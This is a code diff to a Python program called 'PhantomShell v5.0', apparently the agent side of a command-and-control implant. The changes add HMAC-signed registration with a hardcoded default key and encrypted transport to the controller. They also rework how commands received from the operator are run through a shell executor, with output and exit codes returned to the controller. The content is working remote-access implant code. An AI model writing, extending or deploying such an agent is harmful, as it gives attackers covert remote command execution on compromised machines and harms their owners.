@@ -2,6 +2,8 @@
 """PhantomShell v5.0 — Python Agent"""
 
 import argparse
+import hashlib
+import hmac
 import json
 import logging
 import os
@@ -159,7 +161,13 @@ def main():
             sysinfo["capabilities"] = dispatcher.modules
             sysinfo["sleep"] = scheduler.sleep_time
             sysinfo["jitter"] = scheduler.jitter_percent
-            send_msg("register", sysinfo, seq=seq)
+            psk = os.environ.get("PS_AUTH_KEY", "phantomshell-default-key")
+            reg_msg = build_message("register", sysinfo, seq=seq)
+            reg_msg["auth"] = hmac.new(psk.encode(), AGENT_ID.encode(), hashlib.sha256).hexdigest()
+            data = json.dumps(reg_msg).encode()
+            if cipher:
+                data = cipher.encrypt(data)
+            transport.send(data)
             seq += 1
 
             ack = recv_msg()
@@ -199,16 +207,17 @@ def main():
             if command == "exit":
                 send_msg("response", {
                     "task_id": task_id,
-                    "status": "success",
+                    "status": "ok",
                     "output": "Agent shutting down",
                 }, session_id=session_id, seq=seq)
                 break
 
-            if command == "shell" or raw:
-                stdout, stderr, exit_code = executor.execute(raw or cmd_args.get("cmd", ""), timeout=timeout)
+            if command == "shell":
+                cmd_to_run = raw or cmd_args.get("cmd", "")
+                stdout, stderr, exit_code = executor.execute(cmd_to_run, timeout=timeout)
                 response_payload = {
                     "task_id": task_id,
-                    "status": "success" if exit_code == 0 else "error",
+                    "status": "ok" if exit_code == 0 else "error",
                     "output": stdout,
                     "error": stderr,
                     "exit_code": exit_code,
@@ -217,11 +226,12 @@ def main():
                 result = dispatcher.dispatch(command, cmd_args)
                 response_payload = {"task_id": task_id, **result}
             else:
-                stdout, stderr, exit_code = executor.execute(command + " " + " ".join(
-                    f"{v}" for v in (cmd_args.values() if cmd_args else [])), timeout=timeout)
+                cmd_to_run = raw or (command + " " + " ".join(
+                    f"{v}" for v in (cmd_args.values() if cmd_args else [])))
+                stdout, stderr, exit_code = executor.execute(cmd_to_run, timeout=timeout)
                 response_payload = {
                     "task_id": task_id,
-                    "status": "success" if exit_code == 0 else "error",
+                    "status": "ok" if exit_code == 0 else "error",
                     "output": stdout,
                     "error": stderr,
                     "exit_code": exit_code,
